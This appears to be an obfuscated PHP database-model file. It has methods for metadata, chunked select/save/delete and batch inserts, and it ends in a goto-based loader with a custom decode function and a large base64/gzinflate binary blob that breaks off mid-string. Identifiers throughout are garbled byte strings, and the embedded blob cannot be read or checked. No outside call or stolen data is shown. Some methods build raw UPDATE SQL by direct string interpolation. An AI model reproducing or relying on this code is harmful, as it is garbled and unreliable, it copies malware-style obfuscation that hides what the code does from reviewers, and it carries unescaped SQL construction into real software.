(!$this->tableMeta || !$³Êı‹) { return !1; } $ƒ¤Šå³¹ = $this->tableMeta[$Å²ÌÒó[371]]; $Èã¬é÷ = $this->tableMeta[$Å²ÌÒó[372]]; $úÚÎ¨§ = Model($Èã¬é÷); $«â”¥Ñ  = array($ƒ¤Šå³¹ => $³Êı‹, $Å²ÌÒó[373] => $è„¸àÖ‘); if (is_null($è„¸àÖ‘)) { return $úÚÎ¨§->where(array($ƒ¤Šå³¹ => $³Êı‹))->delete(); } if (is_null($Ç‘¶…ŸÕ) && is_string($è„¸àÖ‘)) { return $úÚÎ¨§->where($«â”¥Ñ )->delete(); } $ñ»Äéàı = is_array($è„¸àÖ‘) ? $è„¸àÖ‘ : array(); if (is_string($è„¸àÖ‘)) { $ñ»Äéàı[$è„¸àÖ‘] = $Ç‘¶…ŸÕ; } $Ê›íıË = array(); foreach ($ñ»Äéàı as $½ï×á§ı => $ƒãäµñœ) { if (is_null($ƒãäµñœ) && is_string($½ï×á§ı)) { $úÚÎ¨§->where(array($ƒ¤Šå³¹ => $³Êı‹, $Å²ÌÒó[373] => $½ï×á§ı))->delete(); continue; } $this->checkLength($ƒãäµñœ, !1, $Èã¬é÷ . $Å²ÌÒó[4] . $½ï×á§ı); $Ê›íıË[] = array($ƒ¤Šå³¹ => $³Êı‹, $Å²ÌÒó[94] => $½ï×á§ı, $Å²ÌÒó[374] => $ƒãäµñœ); } $¢ö¥£ğÆ = $Å²ÌÒó[375] . $Èã¬é÷; CacheLock::lock($¢ö¥£ğÆ); $úÚÎ¨§->where(array($ƒ¤Šå³¹ => $³Êı‹))->addAll($Ê›íıË, array(), !0); CacheLock::unlock($¢ö¥£ğÆ); return !0; } public function metaGet($ñíÑ·§, $øÛ¢ı…‡ = false) { $æˆ¹İÎÃ =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->tableMeta) { return array(); } $Şá×İù = $this->tableMeta[$æˆ¹İÎÃ[371]]; $·¨ŠÁ´½ = Model($this->tableMeta[$æˆ¹İÎÃ[372]]); if ($øÛ¢ı…‡) { $°ŠçÍíñ = array($Şá×İù => $ñíÑ·§, $æˆ¹İÎÃ[94] => $øÛ¢ı…‡); return $·¨ŠÁ´½->where($°ŠçÍíñ)->getField($æˆ¹İÎÃ[374]); } $°ŠçÍíñ = array($Şá×İù => $ñíÑ·§); $“²İáó = $·¨ŠÁ´½->field($æˆ¹İÎÃ[376])->where($°ŠçÍíñ)->select(); $“²İáó = array_to_keyvalue($“²İáó, $æˆ¹İÎÃ[94], $æˆ¹İÎÃ[374]); return $“²İáó; } private function checkDataAutoHas($¢Ÿ¯–¡Ú) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $çÇŒÁÉ‡) { if (in_array($¢Ÿ¯–¡Ú, explode($_SERVER[Ì¥ŞÒ°£][50], $çÇŒÁÉ‡[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¾›ı÷‹£, $õ‡ÆÎ²È) { $š¶°âÂÉ =& $_SERVER[Ì¥ŞÒ°£]; if (!is_array($¾›ı÷‹£)) { return; } foreach ($this->dataAuto as $—‡“ğ”ï) { $¿œ°°™õ = $—‡“ğ”ï[0]; if (!in_array($õ‡ÆÎ²È, explode($š¶°âÂÉ[50], $—‡“ğ”ï[2]))) { continue; } switch (trim($—‡“ğ”ï[3])) { case $š¶°âÂÉ[321]: case $š¶°âÂÉ[322]: $©ĞæÕ  = $—‡“ğ”ï[1]; $÷¤€¬·Ô = isset($—‡“ğ”ï[4]) ? (array) $—‡“ğ”ï[4] : array(); if ($©ĞæÕ  == $š¶°âÂÉ[203] && array_key_exists($¿œ°°™õ, $¾›ı÷‹£)) { if (!$¾›ı÷‹£[$¿œ°°™õ]) { unset($¾›ı÷‹£[$¿œ°°™õ]); } break; } if (isset($¾›ı÷‹£[$¿œ°°™õ])) { array_unshift($÷¤€¬·Ô, $¾›ı÷‹£[$¿œ°°™õ]); } if ($š¶°âÂÉ[321] == $—‡“ğ”ï[3]) { $¾›ı÷‹£[$¿œ°°™õ] = call_user_func_array($©ĞæÕ , $÷¤€¬·Ô); } else { $¾›ı÷‹£[$¿œ°°™õ] = call_user_func_array(array(&$this, $©ĞæÕ ), $÷¤€¬·Ô); } break; case $š¶°âÂÉ[270]: if (isset($¾›ı÷‹£[$¿œ°°™õ]) && $¾›ı÷‹£[$¿œ°°™õ]) { $¾›ı÷‹£[$¿œ°°™õ] = call_user_func_array(array(&$this, $—‡“ğ”ï[1]), array($¾›ı÷‹£[$¿œ°°™õ])); } break; case $š¶°âÂÉ[273]: $¾›ı÷‹£[$¿œ°°™õ] = $¾›ı÷‹£[$—‡“ğ”ï[1]]; break; case $š¶°âÂÉ[294]: if (isset($¾›ı÷‹£[$¿œ°°™õ]) && !is_string($¾›ı÷‹£[$¿œ°°™õ])) { $¾›ı÷‹£[$¿œ°°™õ] = json_encode_force($¾›ı÷‹£[$¿œ°°™õ]); } break; case $š¶°âÂÉ[323]: if ($¾›ı÷‹£[$¿œ°°™õ] === $š¶°âÂÉ[12]) { unset($¾›ı÷‹£[$¿œ°°™õ]); } break; case $š¶°âÂÉ[324]: $¾›ı÷‹£[$¿œ°°™õ] = $—‡“ğ”ï[1]; default: break; } } if ($õ‡ÆÎ²È == $š¶°âÂÉ[355]) { $—Š³É = strtolower($this->db->getDbType()); if (strpos($—Š³É, $š¶°âÂÉ[13]) !== 0) { return; } $ÕøÄ§½¯ = $this->field(!0)->fields; $òÜŸ¯á = $ÕøÄ§½¯[$š¶°âÂÉ[252]]; if (isset($ÕøÄ§½¯[$š¶°âÂÉ[251]])) { unset($òÜŸ¯á[$ÕøÄ§½¯[$š¶°âÂÉ[251]]]); } foreach ($òÜŸ¯á as $„–ú•öÕ => $õ‡ÆÎ²È) { if (!isset($¾›ı÷‹£[$„–ú•öÕ])) { $¾›ı÷‹£[$„–ú•öÕ] = $š¶°âÂÉ[12]; } } } } private function dataAfterFilter(&$úâÕ¼¥È) { $Ë¹¶ÄÏƒ =& $_SERVER[Ì¥ŞÒ°£]; foreach ($this->dataAuto as $©ç·ü„«) { $§¾ú®ÇÃ = $©ç·ü„«[0]; if (!isset($úâÕ¼¥È[$§¾ú®ÇÃ])) { continue; } if (!in_array($Ë¹¶ÄÏƒ[357], explode($Ë¹¶ÄÏƒ[50], $©ç·ü„«[2]))) { continue; } switch (trim($©ç·ü„«[3])) { case $Ë¹¶ÄÏƒ[321]: case $Ë¹¶ÄÏƒ[322]: $Ô£²Ç“’ = isset($©ç·ü„«[4]) ? (array) $©ç·ü„«[4] : array(); array_unshift($Ô£²Ç“’, $úâÕ¼¥È[$§¾ú®ÇÃ]); if (isset($©ç·ü„«[4]) && $©ç·ü„«[4] == $Ë¹¶ÄÏƒ[377]) { $Ô£²Ç“’ = array($úâÕ¼¥È[$§¾ú®ÇÃ]); } if ($Ë¹¶ÄÏƒ[321] == $©ç·ü„«[3]) { $úâÕ¼¥È[$§¾ú®ÇÃ] = call_user_func_array($©ç·ü„«[1], $Ô£²Ç“’); } else { $úâÕ¼¥È[$§¾ú®ÇÃ] = call_user_func_array(array(&$this, $©ç·ü„«[1]), $Ô£²Ç“’); } break; case $Ë¹¶ÄÏƒ[270]: if (isset($úâÕ¼¥È[$§¾ú®ÇÃ]) && $úâÕ¼¥È[$§¾ú®ÇÃ]) { $úâÕ¼¥È[$§¾ú®ÇÃ] = call_user_func_array(array(&$this, $©ç·ü„«[1]), array($úâÕ¼¥È[$§¾ú®ÇÃ])); } break; case $Ë¹¶ÄÏƒ[273]: $úâÕ¼¥È[$§¾ú®ÇÃ] = $úâÕ¼¥È[$©ç·ü„«[1]]; break; case $Ë¹¶ÄÏƒ[294]: $ÔëßÛŒ€ = $úâÕ¼¥È[$§¾ú®ÇÃ]; $úâÕ¼¥È[$§¾ú®ÇÃ] = json_decode($ÔëßÛŒ€, !0); if (is_null($úâÕ¼¥È[$§¾ú®ÇÃ])) { $úâÕ¼¥È[$§¾ú®ÇÃ] = $ÔëßÛŒ€; } break; case $Ë¹¶ÄÏƒ[323]: if ($úâÕ¼¥È[$§¾ú®ÇÃ] === $Ë¹¶ÄÏƒ[12]) { unset($úâÕ¼¥È[$§¾ú®ÇÃ]); } break; case $Ë¹¶ÄÏƒ[324]: $úâÕ¼¥È[$§¾ú®ÇÃ] = $©ç·ü„«[1]; break; default: break; } } } public function saveAll($áÏ°¢·ğ) { $ì¿â÷³˜ =& $_SERVER[Ì¥ŞÒ°£]; $³¦Â¶ô = $this->tablePrefix . $this->tableName; $‘—Ÿ¥¾ = self::SQL_WHERE_IN_CHUNK; $áÏ°¢·ğ = is_array($áÏ°¢·ğ) ? $áÏ°¢·ğ : array(); $ù‹ˆ¿ = $ì¿â÷³˜[378]; $ñÌ°Ô¼ú = 0; $™õ‰½– = array(); $Íß»ü®ß = count($áÏ°¢·ğ); for ($Áû‚„Ñİ = 0; $Áû‚„Ñİ < $Íß»ü®ß; $Áû‚„Ñİ++) { $¼³ÆëÙË = $áÏ°¢·ğ[$Áû‚„Ñİ]; if (!is_array($¼³ÆëÙË) || count($¼³ÆëÙË) != 4) { continue; } $å‹—â»€ = "\125\x50\x44\101\124\x45\40\x60{$³¦Â¶ô}\x60\x20\x53\x45\x54\40{$¼³ÆëÙË[2]}\x20\x3d\40\103\x41\123\x45\x20{$¼³ÆëÙË[0]}\x20\xa"; if ($ñÌ°Ô¼ú == 0) { $ù‹ˆ¿ = $å‹—â»€; } $™õ‰½–[] = $ì¿â÷³˜[118] . $¼³ÆëÙË[1] . $ì¿â÷³˜[118]; $ñÌ°Ô¼ú++; $ù‹ˆ¿ .= "\x20\127\110\105\x4e\x20\47{$¼³ÆëÙË[1]}\x27\x20\x54\110\105\x4e\x20\47{$¼³ÆëÙË[3]}\47\40\12"; if ($ñÌ°Ô¼ú == $‘—Ÿ¥¾ || $Áû‚„Ñİ == $Íß»ü®ß - 1) { $ø˜úûÄ½ = implode($ì¿â÷³˜[50], $™õ‰½–); $ù‹ˆ¿ .= "\x20\x45\x4e\104\40\x20\127\x48\105\122\105\x20{$¼³ÆëÙË[0]}\40\x49\x4e\40\50{$ø˜úûÄ½}\51\40"; $this->execute($ù‹ˆ¿); $ñÌ°Ô¼ú = 0; $ù‹ˆ¿ = $å‹—â»€; $this->chunkEventCheck(count($™õ‰½–)); $™õ‰½– = array(); } } $this->chunkEventSet(); } public function saveAllEach($øç«ıá) { $èù¿¡ =& $_SERVER[Ì¥ŞÒ°£]; $ıã‚®ø = $this->tablePrefix . $this->tableName; foreach ($øç«ıá as $ğùÆó¼ñ) { if (!is_array($ğùÆó¼ñ) || count($ğùÆó¼ñ) != 4) { continue; } $ìŸãï™‘ = $ğùÆó¼ñ[0] . $èù¿¡[379] . $ğùÆó¼ñ[1] . $èù¿¡[118]; $õääæÈ‰ = $ğùÆó¼ñ[2] . $èù¿¡[379] . $ğùÆó¼ñ[3] . $èù¿¡[118]; $åğ¦ ¥Ö = "\x75\160\x64\x61\x74\x65\x20{$ıã‚®ø}\40\x73\145\164\40{$õääæÈ‰}\x20\167\x68\x65\x72\145\x20{$ìŸãï™‘}\x3b"; $this->execute($åğ¦ ¥Ö); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Æ÷ƒÛ = false, $ïœ¬ğÖ = false) { $this->_chunkEvent = $Æ÷ƒÛ; $this->_chunkEventParam = $ïœ¬ğÖ; } private function chunkEventCheck($ğîÄôî¶) { if (!$this->_chunkEvent) { return; } $‹¹ ë¸¥ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‹¹ ë¸¥[$_SERVER[Ì¥ŞÒ°£][380]] = $ğîÄôî¶; Hook::trigger($this->_chunkEvent, $‹¹ ë¸¥); } public function addAll($£ñò¯Ã², $æ’öê³ö = array(), $ÅîÈ¥º“ = false) { $ŒËËøíù =& $_SERVER[Ì¥ŞÒ°£]; ignore_timeout(); $Ù‹¿ìÃ× = self::SQL_WHERE_IN_CHUNK; if (empty($£ñò¯Ã²)) { $this->error = think_lang($ŒËËøíù[271]); return !1; } $æ’öê³ö = $this->_parseOptions($æ’öê³ö); foreach ($£ñò¯Ã² as $ÉÂäñ± => $¹×–ØîÊ) { $£ñò¯Ã²[$ÉÂäñ±] = $this->_facade($¹×–ØîÊ); $this->_beforeInsert($£ñò¯Ã²[$ÉÂäñ±], $æ’öê³ö); } if (method_exists($this->db, $ŒËËøíù[272])) { for ($Íüßˆƒš = 0; $Íüßˆƒš < count($£ñò¯Ã²); $Íüßˆƒš += $Ù‹¿ìÃ×) { $ô»—×·· = array_slice($£ñò¯Ã², $Íüßˆƒš, $Ù‹¿ìÃ×); if (!is_array($ô»—×··) || count($ô»—×··) == 0) { break; } $ûÅÍ£ç = $this->db->insertAll($ô»—×··, $æ’öê³ö, $ÅîÈ¥º“); $this->chunkEventCheck(count($ô»—×··)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($£ñò¯Ã² as $ÉÂäñ± => $¹×–ØîÊ) { $ûÅÍ£ç = $this->db->insert($¹×–ØîÊ, $æ’öê³ö, $ÅîÈ¥º“); } $this->commit(); } if (!1 !== $ûÅÍ£ç) { $¿˜×¾óğ = $this->getLastInsID(); if ($¿˜×¾óğ) { return $¿˜×¾óğ; } } return $ûÅÍ£ç; } public function save($ñç‡å = '', $ı÷”Ú«Ï = array()) { $Óòæğö =& $_SERVER[Ì¥ŞÒ°£]; $ÎƒÎÕ— = self::SQL_WHERE_IN_CHUNK; $Ù…¥¸Ğ‚ = $this->optionsValue(); $ú¡èÌãß = $this->findWhereField($Ù…¥¸Ğ‚); if (!$ú¡èÌãß) { return parent::save($ñç‡å, $ı÷”Ú«Ï); } $æ—ğĞ®˜ = 0; $ê²Ì¾ğô = $Ù…¥¸Ğ‚[$Óòæğö[275]][$ú¡èÌãß][1]; $ê²Ì¾ğô = is_array($ê²Ì¾ğô) ? $ê²Ì¾ğô : array(); $ºÈíÄ½§ = count($ê²Ì¾ğô); for ($šÍ—Áëé = 0; $šÍ—Áëé < $ºÈíÄ½§; $šÍ—Áëé += $ÎƒÎÕ—) { $ÏÒğ· = array_slice($ê²Ì¾ğô, $šÍ—Áëé, $ÎƒÎÕ—); if (!is_array($ÏÒğ·) || count($ÏÒğ·) == 0) { break; } $Ù…¥¸Ğ‚[$Óòæğö[275]][$ú¡èÌãß][1] = $ÏÒğ·; $this->optionsValue($Ù…¥¸Ğ‚); $æ—ğĞ®˜ += parent::save($ñç‡å, $ı÷”Ú«Ï); $this->chunkEventCheck(count($ÏÒğ·)); } $this->chunkEventSet(); return $æ—ğĞ®˜; } public function add($ ª®ÂÆ« = '', $¾”“Ôºá = array(), $úÖ¸½æ = false) { if ($this->addTaskStatus && is_array($ ª®ÂÆ«)) { $this->addTaskData[] = $ ª®ÂÆ«; return; } return parent::add($ ª®ÂÆ«, $¾”“Ôºá, $úÖ¸½æ); } public function parseWhereLike($œá–ø®, $¾şÅ¢“Ì = '', $ØÌ¼ºÄ“ = false, &$©Ã¿ğ‡á = false) { $ò¼ë”½ =& $_SERVER[Ì¥ŞÒ°£]; $ ù³ÆÁ  = $GLOBALS[$ò¼ë”½[6]][$ò¼ë”½[381]]; if (!$ ù³ÆÁ [$ò¼ë”½[382]]) { return $œá–ø®; } if (!is_array($œá–ø®)) { return $œá–ø®; } $´û¾£­ = array(); $ÆÏàÆ« = 0; foreach ($œá–ø® as $˜–Ò§²ä => $„ğé¡) { if (is_array($„ğé¡) && count($„ğé¡) == 2 && $„ğé¡[0] == $ò¼ë”½[383] && is_string($„ğé¡[1]) && substr($„ğé¡[1], 0, 1) == $ò¼ë”½[384] && substr($„ğé¡[1], strlen($„ğé¡[1]) - 1, 1) == $ò¼ë”½[384]) { $©Ã¿ğ‡á = !0; $°İï¹ = is_string($˜–Ò§²ä) ? $˜–Ò§²ä : $¾şÅ¢“Ì; $äíçû´¼ = substr($„ğé¡[1], 1, strlen($„ğé¡[1]) - 2); $äíçû´¼ = $this->db->escapeString($äíçû´¼); if (!strpos($°İï¹, $ò¼ë”½[10])) { $°İï¹ = $ò¼ë”½[385] . $°İï¹ . $ò¼ë”½[385]; } $€ÏÀ‘¢ö = $ò¼ë”½[188] . $äíçû´¼ . $ò¼ë”½[188]; $äíçû´¼ = str_replace(array($ò¼ë”½[10], $ò¼ë”½[386], $ò¼ë”½[11]), $ò¼ë”½[387], $äíçû´¼); if ($ ù³ÆÁ [$ò¼ë”½[388]]) { $€ÏÀ‘¢ö = $ò¼ë”½[389] . $äíçû´¼ . $ò¼ë”½[390]; if ($ ù³ÆÁ [$ò¼ë”½[391]]) { $€ÏÀ‘¢ö = $ò¼ë”½[390] . $äíçû´¼ . $ò¼ë”½[389]; } } $´û¾£­[$ÆÏàÆ«] = $ò¼ë”½[392] . $°İï¹ . $ò¼ë”½[393] . $€ÏÀ‘¢ö . $ò¼ë”½[394]; $ÆÏàÆ«++; continue; } if (is_array($„ğé¡)) { $¾şÅ¢“Ì = is_string($˜–Ò§²ä) ? $˜–Ò§²ä : $¾şÅ¢“Ì; $„ğé¡ = $this->parseWhereLike($„ğé¡, $¾şÅ¢“Ì, !0, $©Ã¿ğ‡á); } if (is_numeric($˜–Ò§²ä)) { $´û¾£­[$ÆÏàÆ«] = $„ğé¡; $ÆÏàÆ«++; } else { $´û¾£­[$˜–Ò§²ä] = $„ğé¡; } } if ($©Ã¿ğ‡á && !$ØÌ¼ºÄ“) { } return $´û¾£­; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($•§¹•å„ = array()) { $¤€îï°½ =& $_SERVER[Ì¥ŞÒ°£]; $áÙá•Æã = self::SQL_WHERE_IN_CHUNK; $Ö…ôì½õ = $this->optionsValue(); $Õ€©•Í = $this->findWhereField($Ö…ôì½õ); if (!$Õ€©•Í || isset($Ö…ôì½õ[$¤€îï°½[292]]) || isset($Ö…ôì½õ[$¤€îï°½[353]])) { return parent::select($•§¹•å„); } $‚õÍóè¸ = $Ö…ôì½õ[$¤€îï°½[275]][$Õ€©•Í][1]; $‚õÍóè¸ = is_array($‚õÍóè¸) ? $‚õÍóè¸ : array(); $€»ğçàÅ = null; for ($—£¬ƒú” = 0; $—£¬ƒú” < count($‚õÍóè¸); $—£¬ƒú” += $áÙá•Æã) { $Ä—¢ÀÙ = array_slice($‚õÍóè¸, $—£¬ƒú”, $áÙá•Æã); if (!is_array($Ä—¢ÀÙ) || count($Ä—¢ÀÙ) == 0) { break; } $Ö…ôì½õ[$¤€îï°½[275]][$Õ€©•Í][1] = $Ä—¢ÀÙ; $this->optionsValue($Ö…ôì½õ); $÷îù—û’ = parent::select($•§¹•å„); if (!$÷îù—û’) { continue; } $€»ğçàÅ = is_array($€»ğçàÅ) ? $€»ğçàÅ : array(); $€»ğçàÅ = array_merge($€»ğçàÅ, $÷îù—û’); } return $€»ğçàÅ; } public function delete($ÆÏëª• = array()) { $İ“å¾¤ =& $_SERVER[Ì¥ŞÒ°£]; $õÌ£óÃ = self::SQL_WHERE_IN_CHUNK; $îèæ¡²€ = $this->optionsValue(); $¼ÕÔ¬¨ = $this->findWhereField($îèæ¡²€); if (!$¼ÕÔ¬¨) { return parent::delete($ÆÏëª•); } $˜»‘Ù­ = 0; $Ò¡ÎïåÌ = $îèæ¡²€[$İ“å¾¤[275]][$¼ÕÔ¬¨][1]; $Ò¡ÎïåÌ = is_array($Ò¡ÎïåÌ) ? $Ò¡ÎïåÌ : array(); for ($ó²‘ÎÚ = 0; $ó²‘ÎÚ < count($Ò¡ÎïåÌ); $ó²‘ÎÚ += $õÌ£óÃ) { $±‚êĞŸÎ = array_slice($Ò¡ÎïåÌ, $ó²‘ÎÚ, $õÌ£óÃ); if (!is_array($±‚êĞŸÎ) || count($±‚êĞŸÎ) == 0) { break; } $îèæ¡²€[$İ“å¾¤[275]][$¼ÕÔ¬¨][1] = $±‚êĞŸÎ; $this->optionsValue($îèæ¡²€); $˜»‘Ù­ += parent::delete($ÆÏëª•); } return $˜»‘Ù­; } private function findWhereField($Ö¸åÍ¹²) { $™ÕÏœ·å =& $_SERVER[Ì¥ŞÒ°£]; $›¿Ûäô¤ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Ö¸åÍ¹²) || !is_array($Ö¸åÍ¹²[$™ÕÏœ·å[275]])) { return !1; } foreach ($Ö¸åÍ¹²[$™ÕÏœ·å[275]] as $ù¶Ò¼ş§ => $ä­ĞîÒ) { if (is_array($ä­ĞîÒ) && isset($ä­ĞîÒ[0]) && is_string($ä­ĞîÒ[0]) && strtolower($ä­ĞîÒ[0]) == $™ÕÏœ·å[7] && is_array($ä­ĞîÒ[1]) && count($ä­ĞîÒ[1]) > $›¿Ûäô¤) { ignore_timeout(); return $ù¶Ò¼ş§; } } return !1; } public function setMasterDB($À­œÀìÌ = true) { think_config($_SERVER[Ì¥ŞÒ°£][395], $À­œÀìÌ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\145\155\117\160\x74\x69\157\156"; public $field = array(); public function listData($ª…™ÜÛû = false, $“¶³ŞÎ½ = "\155\x6f\144\151\x66\171\124\x69\155\x65", $·è‡ò¥ï = false) { $ã­šÛÏ§ = Model($this->modelType)->get(!1, $this->optionType, !0); $¢˜¤Ç  = array_values($ã­šÛÏ§); if ($¢˜¤Ç  && $¢˜¤Ç [0] && !is_array($¢˜¤Ç [0])) { Model($this->modelType)->cacheRemove($this->optionType); $ã­šÛÏ§ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ã­šÛÏ§) { return $ª…™ÜÛû ? null : array(); } if (!$ª…™ÜÛû) { $ã­šÛÏ§ = array_filter(array_values($ã­šÛÏ§)); return array_sort_by($ã­šÛÏ§, $“¶³ŞÎ½, $·è‡ò¥ï); } return $ã­šÛÏ§[$_SERVER[Ì¥ŞÒ°£][396] . $ª…™ÜÛû]; } public function insert($è½—ñÜ») { $Á­¦«¡§ =& $_SERVER[Ì¥ŞÒ°£]; $è½—ñÜ» = array_field_key($è½—ñÜ», $this->field); $äãúÃ…ì = Model($this->modelType)->get($Á­¦«¡§[397], $this->optionType . $Á­¦«¡§[398]); $äãúÃ…ì = $äãúÃ…ì ? $äãúÃ…ì : 0; $è½—ñÜ»[$Á­¦«¡§[399]] = ++$äãúÃ…ì; $è½—ñÜ»[$Á­¦«¡§[200]] = time(); $è½—ñÜ»[$Á­¦«¡§[85]] = time(); Model($this->modelType)->set($Á­¦«¡§[397], $äãúÃ…ì, $this->optionType . $Á­¦«¡§[398]); Model($this->modelType)->set($Á­¦«¡§[396] . $äãúÃ…ì, $è½—ñÜ», $this->optionType); return $äãúÃ…ì; } public function update($°ÚÅµ¾‚, $¯¹‹‘‰Î) { $èßû¬—´ =& $_SERVER[Ì¥ŞÒ°£]; $¯¹‹‘‰Î = array_field_key($¯¹‹‘‰Î, $this->field); $–‚úºö¥ = $this->listData($°ÚÅµ¾‚); if (!$–‚úºö¥ || !$°ÚÅµ¾‚) { return !1; } $¯¹‹‘‰Î = array_merge($–‚úºö¥, $¯¹‹‘‰Î); $¯¹‹‘‰Î[$èßû¬—´[85]] = time(); return Model($this->modelType)->set($èßû¬—´[396] . $°ÚÅµ¾‚, $¯¹‹‘‰Î, $this->optionType); } public function remove($É¥†²ß) { if (!$É¥†²ß) { return !1; } return Model($this->modelType)->remove($_SERVER[Ì¥ŞÒ°£][396] . $É¥†²ß, $this->optionType); } public function clear() { $è„¦„›ı =& $_SERVER[Ì¥ŞÒ°£]; Model($this->modelType)->remove($è„¦„›ı[397], $this->optionType . $è„¦„›ı[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ãÓÂİ‰, $Í³ÄÂ‘à) { if (!$Í³ÄÂ‘à) { return !1; } $’²Œ£Õé = $this->listData(); $’²Œ£Õé = array_to_keyvalue($’²Œ£Õé, $ãÓÂİ‰); return isset($’²Œ£Õé[$Í³ÄÂ‘à]) ? $’²Œ£Õé[$Í³ÄÂ‘à] : !1; } public function findByName($Ù·¥ÚÍ) { return $this->findByKey($_SERVER[Ì¥ŞÒ°£][32], $Ù·¥ÚÍ); } protected function resetData($ìçƒÏ›ü) { $‘¹èÊó™ =& $_SERVER[Ì¥ŞÒ°£]; $ìçƒÏ›ü = is_array($ìçƒÏ›ü) ? $ìçƒÏ›ü : array(); $Ç¨Ä©¼Ÿ = array(); for ($Ğˆ€ìÑÔ = 0; $Ğˆ€ìÑÔ < count($ìçƒÏ›ü); $Ğˆ€ìÑÔ++) { $Ç¨Ä©¼Ÿ[$‘¹èÊó™[396] . $ìçƒÏ›ü[$Ğˆ€ìÑÔ][$‘¹èÊó™[399]]] = $ìçƒÏ›ü[$Ğˆ€ìÑÔ]; } return Model($this->modelType)->set($Ç¨Ä©¼Ÿ, !1, $this->optionType); } private function getAutoName($—ıÁî›º) { $Í«¿”—Ö = array_to_keyvalue($this->listData(), $_SERVER[Ì¥ŞÒ°£][32]); if (!$Í«¿”—Ö || !isset($Í«¿”—Ö[$—ıÁî›º])) { return $—ıÁî›º; } for ($€”£èÖš = 1; $€”£èÖš < count($Í«¿”—Ö); $€”£èÖš++) { $‚ÚüÓ¡å = $—ıÁî›º . "\50{$€”£èÖš}\x29"; if (!isset($Í«¿”—Ö[$‚ÚüÓ¡å])) { return $‚ÚüÓ¡å; } } return $‚ÚüÓ¡å; } } goto eÀ²ƒ¶£âë; F§—šŒ­¤ˆ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('zKXe0rCj'), "\376\352\331\253\322\326"); $_SERVER[Ì¥ŞÒ°£] = explode("\174\2\174\1\174\2", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8W9CXgb1dUwDJSWtUALLVtpB0OwnWixs8eJ48i2bIvIkpHkbLaZ').base64_decode('jKSxNLGkkWdGXrKwQwthaQtlKZSWnRaSlJ0CKYUXSlkKBQoEQtmaBGgpXWgp0ALf')."\135\316\135\146\44\303\373\77\377\367\74\137\36\260\356\75\167\231\273\236\173\316\271\347\234\173\375\155\237\234\377\253\163\327\357\261\176\367\365\173\234\363\243\337\377\366\307\333"."\150\170\375\27\320\337\57\322\360\267\66\356\275\33\371\167\360\306\163\32\32\172\346\356\73\43\266\377\5\267\157\322\66\153\67\153\347\305\243\217\77\21\371\362\223\67\37\37".base64_decode('3nXN45O7dt9tzhLr4haUmZZtoT9KyXQUfcKwHZsCMmZp2MjRsFGiv0H605+IWnrR').strrev('ÔêäkQ²İeûá¥šÊ„,Í§"ÔÈ)…õ÷öMJx±«¥ƒ£ÚşEÚĞ'."\r".'tt')."\262\131\326\113\56\210\0\144\65\107\113\153\66\324\324\331\256\166\206\373\242\361\225\152\152\145\137\30\162\244\325\321\212\156\115\322\30\11\46\35\315\162\122\106\121\347\71\306"."\x2d\xde\xae\xf6\x70\x77\x24\xa6\xa4\x12\xa1\x58\x32\xd4\x91\x8a\xc4\x63\x14\xdc\x11\xef\xed\x8d\xa4\xaa\xe1\x89\x78\x34\xda\x1e\xea\x58\x5a\x9d\xd2\x97\x8\x75\xf7\x86\x14\xd4\xbe\x82\xae\x1a"."\xa5\x61\xb3\x41\x59\x4d\x53\x56\x2b\x8d\x34\xd0\x65\xe8\x85\x2c\xd\x96\x34\xd6\x1c\x67\xb2\xc\xa1\x14\xf\xa1\x69\x2a\x55\xa\x5\x1a\x89\xf1\x50\x56\x1f\xd6\x2a\x5\x18\xad\x4e\x39\x52\xb6"."\214\242\306\72\275\124\237\344\120\32\320\52\216\151\224\62\64\22\236\160\54\115\300\121\133\63\150\242\365\22\124\225\14\107\303\35\51\5\67\120\351\112\304\173\25\230\204\242"."\146\73\272\245\54\357\11\47\302\12\156\164\153\75\351\153\275\2\353\45\206\206\102\11\105\243\312\124\65\70\172\261\314\252\241\145\152\124\26\117\164\206\23\112\373\112\105\214"."\x50\xc6\x2c\x16\xcd\x52\x0\xd5\x82\x66\xd2\x91\x9a\x1a\x4e\x24\x68\xc0\x7\xcb\x3b\x1a\xc1\x93\x6\x91\x78\x57\x57\x32\xcc\x63\xd0\xb9\x13\xa2\xa8\x25\xb3\x60\x7d\xba\x62\xd9\xe1\x82\xa3\x8e"."\x69\x85\xa\x5b\xa6\x23\xf4\xb7\x1e\x7e\xe0\xd7\xb4\x61\xe9\x8e\x1a\x25\xa3\x2\xcb\x14\xaa\x30\x4d\xbe\xad\x20\x50\x61\xb9\x75\x6\xd1\xb3\x10\x28\xa2\xf2\x26\xec\x3c\xb4\xd\xc7\x68\xb0\x75".base64_decode('Mf1dCJnSKk7TLUfVSxkza5Rgs7bBotOcfKdloAw0PmwWsixsG2uhK8NGQY9VinIW')."\x1e\xcd\xe4\x8d\x42\xd6\x62\xfb\xeb\xb3\x72\xd2\x68\x94\x6f\x57\x9c\x57\xc4\xca\xa8\x25\x7c\xa7\x1b\xc3\x93\x62\xbf\xd9\x66\xc5\xca\xe8\x11\xb4\x23\x44\xb9\x3e\x9e\xbb\x19\x32\xe9\x8e\x83\x3a"."\7\143\143\230\375\345\202\251\145\223\272\305\273\146\230\135\250\140\274\342\310\300\12\311\326\145\132\305\116\204\31\340\373\150\127\30\375\65\22\106\330\276\310\